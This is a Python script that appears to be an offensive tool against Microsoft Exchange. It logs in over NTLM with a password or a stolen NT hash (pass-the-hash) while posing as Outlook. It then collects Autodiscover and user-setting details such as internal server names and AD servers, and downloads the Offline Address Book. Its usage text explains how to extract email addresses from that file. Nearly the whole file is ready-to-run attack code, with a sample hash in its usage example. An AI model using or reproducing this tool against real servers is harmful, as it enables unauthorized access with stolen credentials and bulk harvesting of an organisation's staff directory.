#!python3

import ssl
import sys
import base64
import re
import binascii
import gzip
import shutil

try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm

def checkAutodiscover(host, port, mode, domain, email, data):

    autodiscover_url = "/autodiscover/autodiscover.xml"
    tmp = email.split('@')
    user = tmp[0]

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Accept-Encoding": "gzip",
        "User-Agent": "Microsoft Office/16.0 (Windows NT 6.1; Microsoft Outlook 16.0.4266; Pro)"
    }
    session.request("GET", autodiscover_url, "", headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(autodiscover_url))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False
    
    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!] Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml",      
        "X-Anchormailbox": '%s' % email,
        "X-Mapihttpcapability": '1',
        "Accept-Encoding": 'gzip'
    }
    POST_BODY = '''<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
<Request><EMailAddress>{EMailAddress}</EMailAddress>
<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
</Request></Autodiscover>
'''

    POST_BODY = POST_BODY.format(EMailAddress=email)

    session.request("POST", autodiscover_url, POST_BODY, headers)
    res = session.getresponse()
    body = res.read()
    filedata = gzip.decompress(body).decode("utf-8")
  
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False
    else:
        if 'ErrorCode' in filedata :
            pattern_name = re.compile(r"<ErrorCode>(.*?)</ErrorCode>")
            name = pattern_name.findall(filedata)
            print('[!] ErrorCode:%s'%(name[0]))
            pattern_name = re.compile(r"<Message>(.*?)</Message>")
            name = pattern_name.findall(filedata)
            print('[!] Message:%s'%(name[0]))

        else: 
            print('[+] Valid:%s %s'%(user,data))

            pattern_name = re.compile(r"<LegacyDN>(.*?)</LegacyDN>")
            name = pattern_name.findall(filedata)
            print('[+] LegacyDN:%s'%(name[0]))

            pattern_name = re.compile(r"<OABUrl>(.*?)</OABUrl>")
            name = pattern_name.findall(filedata)
            print('[+] OABUrl:%s'%(name[0]))

            if 'InternalUrl' in filedata:
                pattern_name = re.compile(r"<InternalUrl>(.*?)</InternalUrl>")
                name = pattern_name.findall(filedata)
                print('[+] InternalUrl:%s'%(name[0]))

            if '<AD>' in filedata:
                pattern_name = re.compile(r"<AD>(.*?)</AD>")
                name = pattern_name.findall(filedata)
                print('[+] AD:%s'%(name[0]))

        filename = "checkAutodiscover.xml"    
        print('[+] Save response file to %s'%(filename))
        with open(filename, 'w+') as file_object:
            file_object.write(filedata)
        return True
   

def getUsersetting(host, port, mode, domain, email, data):
    autodiscover_url = "/autodiscover/autodiscover.svc"
    tmp = email.split('@')
    user = tmp[0]
    POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:a="http://schemas.microsoft.com/exchange/2010/Autodiscover" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <a:RequestedServerVersion>Exchange2013_SP1</a:RequestedServerVersion>
    <wsa:Action>http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetUserSettings</wsa:Action>
    <wsa:To>https://{domain}/autodiscover/autodiscover.svc</wsa:To>
  </soap:Header>
  <soap:Body>
    <a:GetUserSettingsRequestMessage xmlns:a="http://schemas.microsoft.com/exchange/2010/Autodiscover">
      <a:Request>
        <a:Users>
          <a:User>
            <a:Mailbox>{mail}</a:Mailbox>
          </a:User>
        </a:Users>
        <a:RequestedSettings>
          <a:Setting>UserDisplayName</a:Setting>
          <a:Setting>UserDN</a:Setting>
          <a:Setting>UserDeploymentId</a:Setting>
          <a:Setting>InternalMailboxServer</a:Setting>
          <a:Setting>MailboxDN</a:Setting>
          <a:Setting>PublicFolderServer</a:Setting>
          <a:Setting>ActiveDirectoryServer</a:Setting>
          <a:Setting>ExternalMailboxServer</a:Setting>
          <a:Setting>EcpDeliveryReportUrlFragment</a:Setting>
          <a:Setting>EcpPublishingUrlFragment</a:Setting>
          <a:Setting>EcpTextMessagingUrlFragment</a:Setting>
          <a:Setting>ExternalEwsUrl</a:Setting>
          <a:Setting>CasVersion</a:Setting>
          <a:Setting>EwsSupportedSchemas</a:Setting>
          <a:Setting>GroupingInformation</a:Setting>
        </a:RequestedSettings>
      </a:Request>
    </a:GetUserSettingsRequestMessage>
  </soap:Body>
</soap:Envelope>
'''
    DomainName = input("Input the domain name of the exchange server(not ip):")
    POST_BODY = POST_BODY.format(domain=DomainName, mail=email)

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", autodiscover_url, POST_BODY, headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(autodiscover_url))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False

    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!] Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("POST", autodiscover_url, POST_BODY, headers)
    res = session.getresponse()
    body = res.read()
    filename = "getUsersetting.xml"
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False

    else:
        print('[+] Valid:%s %s'%(user,data))       
        #print(body)
        print('[+] Save response file to %s'%(filename))
        with open(filename, 'w+', encoding='utf-8') as file_object:
            file_object.write(bytes.decode(body))
        return True


def checkoab(host, port, mode, domain, email, data):
    OABID = input("Input the OABID:")
    OAB_url = "/OAB/" + OABID + "/oab.xml"
    tmp = email.split('@')
    user = tmp[0]

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }
    session.request("GET", OAB_url, "", headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(OAB_url))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False
    
    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!] Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("GET", OAB_url, "", headers)
    res = session.getresponse()
    body = res.read()
  
    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False
    else:
        filename = "checkOAB.xml"
        print('[+] Save response file to %s'%(filename))
        with open(filename, 'w+', encoding='utf-8') as file_object:
            file_object.write(bytes.decode(body))

        pattern_name = re.compile(r">(.+lzx)<")
        name = pattern_name.findall(bytes.decode(body))      
        if name:
            print('[+] Default Global Address:%s'%(name[0]))

        return True


def downloadlzx(host, port, mode, domain, email, data):

    OABID = input("Input the OABID:")
    lzxID = input("Input the lzx ID:(Eg: xx.lzx)")

    lzxURL = "/OAB/" + OABID + "/" + lzxID
    tmp = email.split('@')
    user = tmp[0]

    if port ==443:
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(host, port, context=uv_context)
        except AttributeError:
            session = HTTPSConnection(host, port)
    else:        
        session = HTTPConnection(host, port)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(host, domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    headers = {
        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }
    session.request("GET", lzxURL, "", headers)

    res = session.getresponse()
    res.read()

    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
        return False
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server for url %s'%(lzxURL))
        return False

    print('[*] Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False
    
    if mode =='plaintext':
        password1 = data;
        nt_hash = ''

    elif mode =='ntlmhash':
        password1 = ''
        nt_hash = binascii.unhexlify(data)

    else:
        print('[!] Wrong parameter')
        return False

    lm_hash = ''    
    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
        "Content-type": "text/xml; charset=utf-8",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    session.request("GET", lzxURL, "", headers)
    res = session.getresponse()
    body = res.read()    
    filedata = gzip.decompress(body)

    if res.status == 401:
        print('[!] Server returned HTTP status 401 - authentication failed')
        return False
    else:
        if res.status == 200:            
            filename = lzxID
            print('[+] Save lzx file to %s'%(filename))
            print('\r\n[*] Then you can use oabextract to decrype the lzx file in Kali Linux.')
            print('Eg.')            
            print('oabextract 4667c322-5c08-4cda-844a-253ff36b4a6a-data-5.lzx gal.oab')
            print('strings gal.oab|grep SMTP')
            with open(filename, 'wb+') as file_object:
                file_object.write(filedata)

        return True

if __name__ == '__main__':
    if len(sys.argv)!=8:
        print('checkAutodiscoverEX')       
        print('Use to access Autodiscover.xml and get the user\'s configuration(Support plaintext and ntlmhash)')
        print('Extra mode of checkAutodiscover')
        print('Add a <domain> parameter')        
        print('Usage:')
        print('%s <host> <port> <mode> <domain> <email> <password> <command>'%(sys.argv[0]))
        print('<command>:')
        print('- checkautodiscover')
        print('- getusersetting')
        print('- checkoab')
        print('- downloadlzx')       
        print('Eg.')
        print('%s 192.168.1.1 443 plaintext test.com user1@test.com password1 checkautodiscover'%(sys.argv[0]))
        print('%s test.com 80 ntlmhash test.com user1@test.com c5a237b7e9d8e708d8436b6148a25fa1 getusersetting'%(sys.argv[0]))
        sys.exit(0)
    else:
        if sys.argv[7] == "checkautodiscover":
            checkAutodiscover(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
        elif sys.argv[7] == "getusersetting": 
            getUsersetting(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
        elif sys.argv[7] == "checkoab": 
            checkoab(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
        elif sys.argv[7] == "downloadlzx": 
            downloadlzx(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])

        else:
            print('[!] Wrong parameter')